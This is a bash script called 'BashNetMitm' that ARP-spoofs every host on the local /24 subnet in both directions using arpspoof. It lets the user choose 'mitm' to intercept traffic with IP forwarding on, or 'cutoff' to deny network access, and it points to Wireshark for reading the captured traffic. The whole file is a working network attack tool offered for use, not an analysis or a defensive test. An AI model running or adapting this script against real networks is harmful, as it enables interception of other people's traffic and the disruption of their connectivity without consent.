#!/bin/bash
IGreen='\033[0;92m'       # Green
IYellow='\033[0;93m'      # Yellow
Color_Off='\033[0m'       # Text Reset
BIYellow='\033[1;93m'     # BOLD Yellow
ICyan='\033[0;96m'        # Cyan
Blink='\033[33;7m'        #Blink
IRed='\033[0;91m'         # Red

showLoading() {
  mypid=$!
  loadingText=$1

  echo -ne "$loadingText\r"

  while kill -0 $mypid 2>/dev/null; do
    echo -ne "$loadingText.\r"
    sleep 0.5
    echo -ne "$loadingText..\r"
    sleep 0.5
    echo -ne "$loadingText...\r"
    sleep 0.5
    echo -ne "\r\033[K"
    echo -ne "$loadingText\r"
    sleep 0.5
  done

  echo "$loadingText...FINISHED"
}
spinner() {
    local i sp n
    sp='/-\|'
    n=${#sp}
    printf ' '
    while sleep 0.1; do
        printf "%s\b" "${sp:i++%n:1}"
    done
}

if [ "$EUID" != 0 ]
  then echo "Please run as root !"
  exit
fi

#Getting useful informations

GATEWAY_IP=$(/sbin/ip route | awk '/default/ { print $3 }')
LOCAL_IP=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')

read A B C D <<<"${LOCAL_IP//./ }"
read E F G H <<<"${GATEWAY_IP//./ }"

printf "\n"
   
echo -e "\033[0;92m10101011010101000101010110100011011010111010101001001010101001010100010101$Color_Off"
echo -e "\033[0;92m00101010101011101010101000101010101010001010110101010110110101101010111010$Color_Off"
echo -e "\033[0;92m11010101011010101010110010101010101010101011011010101011010100110010101011$Color_Off"
echo -e "\033[0;92m0101010101010001010101001 \033[1;93mCODED BY LOCALH0STT \033[0;92m1010100101001010100100101010$Color_Off"
echo -e "\033[0;92m10101010010101010101010101101010101010100101010101001001101010101010010101$Color_Off"
echo -e "\033[0;92m10101010101001010100101010100010010101001010101101101110101010101000101011$Color_Off"
echo -e "\033[0;92m01011010101001010101001010101010101010010101010100101101010110111010100101$Color_Off"
echo -e "\033[0;96mlinktr.ee/localh0stt      twitter : @localhostt       github : @localhostt$Color_Off"
printf "\033[0;91m__________________________________________________________________________$Color_Off\n"
printf "\n"

printf "\033[0;91mDetecting your local and gateway IPv4\n$Color_Off" & sleep 2 & showLoading

printf "Your Local IP is \033[0;93m$LOCAL_IP $Color_Off\n"
printf "Your Gateway IP is \033[0;93m$GATEWAY_IP $Color_Off\n"

printf "\033[0;91m__________________________________________________________________________$Color_Off\n"
printf "\n"

printf "Specify the interface \033[0;93m(\033[0mwlan0\033[0;93m/\033[0meth0\033[0;93m/\033[0musb0\033[0;93m/\033[0mbnep0\033[0;93m)\033[0m \033[0;91m$(tput blink)---> \033[0m"
read INTERFACE1 INTERFACE2
while [ $INTERFACE1$INTERFACE2 != "wlan0" ] && [ $INTERFACE1$INTERFACE2 != "eth0" ] && [ $INTERFACE1$INTERFACE2 != "usb0" ] && [ $INTERFACE1$INTERFACE2 != "bnep0" ]
  do
    printf "\033[0;91mWrong input, retry again\033[0m \n"
    printf "Specify the interface \033[0;93m(\033[0mwlan0\033[0;93m/\033[0meth0\033[0;93m/\033[0musb0\033[0;93m/\033[0mbnep0\033[0;93m)\033[0m \033[0;91m$(tput blink)---> \033[0m"
    read INTERFACE1 INTERFACE2
  done

printf "\033[0;91m__________________________________________________________________________$Color_Off\n"
printf "\n"

printf "Choose the purpose of spoofing \033[0;93m(\033[0mmitm\033[0;93m/\033[0mcutoff\033[0;93m)\033[0m \033[0;91m$(tput blink)---> $Color_Off"
read PURPOSE1 PURPOSE2
while [ $PURPOSE1$PURPOSE2 != "mitm" ] && [ $PURPOSE1$PURPOSE2 != "cutoff" ]
  do
    printf "\033[0;91mWrong input, retry again\033[0m \n"
    printf "Choose the purpose of spoofing \033[0;93m(\033[0mmitm\033[0;93m/\033[0mcutoff\033[0;93m)\033[0m \033[0;91m$(tput blink)---> $Color_Off"
    read PURPOSE1 PURPOSE2
  done

if [ $PURPOSE1$PURPOSE2 == "mitm" ]
  then
    sysctl net.ipv4.ip_forward=1
elif [ $PURPOSE1$PURPOSE2 == "cutoff" ]
  then 
    sysctl net.ipv4.ip_forward=0
fi

printf "\033[0;91m__________________________________________________________________________$Color_Off\n"
printf "\n"

#------------------------------------------------------------------------------------------------
#Update 1.2
#Adding device exceptions (ipv4)
printf "Want to add one exception between the targets? (Y/N) \033[0;91m$(tput blink)---> $Color_Off"
read EXCEPTION_STTS

while [ $EXCEPTION_STTS != Y ] && [ $EXCEPTION_STTS != y ] && [ $EXCEPTION_STTS != N ] && [ $EXCEPTION_STTS != n ]
  do
    printf "\033[0;91mWrong input, retry again\033[0m \n"
    printf "Want to add one exception between the targets? (Y/N) \033[0;91m$(tput blink)---> $Color_Off"
    read EXCEPTION_STTS
  done

if [ $EXCEPTION_STTS == "y" ] || [ $EXCEPTION_STTS == "Y" ]

  then 
    printf "Enter the 4th byte of the exception device (Example 154 for 192.168.1.154) \033[0;91m$(tput blink)---> $Color_Off"
    read Fbyte
    while [ "$Fbyte" -gt 254 ] || [ "$Fbyte" -lt 1 ]
      do 
        printf "\033[0;91mWrong input, retry again\033[0m \n"
        printf "Enter the 4th byte of the exception device (Example 154 for 192.168.1.154) \033[0;91m$(tput blink)---> $Color_Off"
        read Fbyte
      done
elif [ $EXCEPTION_STTS == "n" ] || [ $EXCEPTION_STTS == "N" ]
  then
    printf "\033[0;93mNo device exception added. $Color_Off \n"
fi
#--------------------------------------------------------------------------------------------------------
printf "\n"
echo -e "\033[0;91m$(tput blink)Proceeding in 3 seconds...$Color_Off"
sleep 3
printf "\033[0;91m__________________________________________________________________________$Color_Off\n"
printf "\n"

#The arp spoofing must be two-sided:
#router-->victims exculding router and localhost from victims 
#victims-->router excluding localhost from victims
i=1
j=1

if [ $EXCEPTION_STTS == "y" ] || [ $EXCEPTION_STTS == "Y" ]
  then
    while [ "$i" -le  254 ]
      do
        if [ "$i" -ne $D ] && [ "$i" -ne $Fbyte ]
          then
            arpspoof -i $INTERFACE1$INTERFACE2 -t $GATEWAY_IP $A.$B.$C.$i 2>/dev/null 1>/dev/null &
        fi 
        i=$(( $i+1 ))
      done
    #--------------------------------------------------------------------------------------------
    while [ "$j" -le  254 ]
      do
        if [ "$j" -ne $D ] && [ "$j" -ne $H ] && [ "$j" -ne $Fbyte ]
          then 
            arpspoof -i $INTERFACE1$INTERFACE2 -t $A.$B.$C.$j $GATEWAY_IP 2>/dev/null 1>/dev/null &
        fi
        j=$(( $j+1 ))
      done


elif [ $EXCEPTION_STTS == "n" ] || [ $EXCEPTION_STTS == "N" ]
  then
    while [ "$i" -le  254 ]
      do
        if [ "$i" -ne $D ]
          then
            arpspoof -i $INTERFACE1$INTERFACE2 -t $GATEWAY_IP $A.$B.$C.$i 2>/dev/null 1>/dev/null &
        fi 
        i=$(( $i+1 ))
      done
    #--------------------------------------------------------------------------------------------
    while [ "$j" -le  254 ]
      do
        if [ "$j" -ne $D ] && [ "$j" -ne $H ]
          then 
            arpspoof -i $INTERFACE1$INTERFACE2 -t $A.$B.$C.$j $GATEWAY_IP 2>/dev/null 1>/dev/null &
        fi
        j=$(( $j+1 ))
      done
fi

printf "\033[0;96mThe process is running in background :D\n$Color_Off"
printf "\n"
printf "\033[0;92mUse \033[0;96mWireshark \033[0;92mto check the results\n$Color_Off"
printf "\n"
printf "\033[0;92mType \033[1;93m'stop' \033[0;92mto stop the spoofing process \033[0;91m$(tput blink)---> $Color_Off"
read EXITSTATUS1 EXITSTATUS2

if [ $EXITSTATUS1$EXITSTATUS2 == "stop" ]
  then 
    printf "\033[0;96m\nThank you for using BashNetMitm !$Color_Off"
    killall arpspoof
    sleep 5
    exit
  else 
    printf "\033[0;91mIgnoring operation$Color_Off\n"
fi

while [ $EXITSTATUS1$EXITSTATUS2 != "stop" ]
  do
    printf "\033[0;92mType \033[1;93m'stop' \033[0;92mto stop the spoofing process \033[0;91m$(tput blink)---> $Color_Off"
    read EXITSTATUS1 EXITSTATUS2
    if [ $EXITSTATUS1$EXITSTATUS2 == "stop" ]
      then 
        printf "\033[0;96m\nThank you for using BashNetMitm !$Color_Off\n"
        killall arpspoof
        sleep 5
        exit
      else 
        printf "\033[0;91mIgnoring operation\n$Color_Off"
    fi
done
